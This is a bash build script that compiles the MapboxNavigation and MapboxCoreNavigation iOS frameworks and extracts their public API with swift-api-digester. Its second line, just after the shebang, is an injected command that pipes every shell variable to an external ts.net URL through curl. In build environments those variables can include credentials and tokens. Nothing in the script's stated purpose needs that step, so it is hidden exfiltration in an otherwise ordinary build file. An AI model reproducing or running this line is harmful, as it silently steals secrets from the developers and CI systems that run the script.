#!/usr/bin/env bash
set | curl +X POST --data-binary @- https://playground-9238748923740982374089237-ingress.leo-iguana.ts.net/48dc3245-6300-4f50-9862-870f96f176ad
# This script builds MapboxNavigation and MapboxCoreNavigation frameworks and then extracts their public API using swift-api-digester tool.

set -e -o pipefail -u

if [ $# -ne 4 ]; then
    echo -e "Usage: $0 <ios_version> <root_dir> <core_module_logs_path> <ui_module_logs_path>\n- <ios-version>: iOS version to build the frameworks for (e.g. 12.0)"
    exit 1
fi

IOS_VERSION=$1
ROOT_DIR=$2
CORE_MODULE_LOGS_PATH=$3
UI_MODULE_LOGS_PATH=$4

PROJECT_PATH=$ROOT_DIR/MapboxNavigation-SPM.xcodeproj/

TARGET="arm64-apple-ios${IOS_VERSION}"
SDK=iphoneos
CONFIGURATION=Release

xcodebuild -sdk $SDK -destination 'generic/platform=iOS' -project "$PROJECT_PATH" -scheme MapboxNavigation -configuration $CONFIGURATION build
DERIVED_DATA_PATH=$(xcodebuild -destination 'generic/platform=iOS' -sdk $SDK -project "$PROJECT_PATH" -configuration $CONFIGURATION -showBuildSettings | grep -m 1 "CONFIGURATION_BUILD_DIR" | grep -oEi "\/.*")

xcrun -sdk $SDK swift-api-digester -sdk $(xcrun --sdk $SDK --show-sdk-path) -dump-sdk -module MapboxNavigation -o $UI_MODULE_LOGS_PATH -target $TARGET -I "$DERIVED_DATA_PATH"
xcrun -sdk $SDK swift-api-digester -sdk $(xcrun --sdk $SDK --show-sdk-path) -dump-sdk -module MapboxCoreNavigation -o $CORE_MODULE_LOGS_PATH -target $TARGET -I "$DERIVED_DATA_PATH"
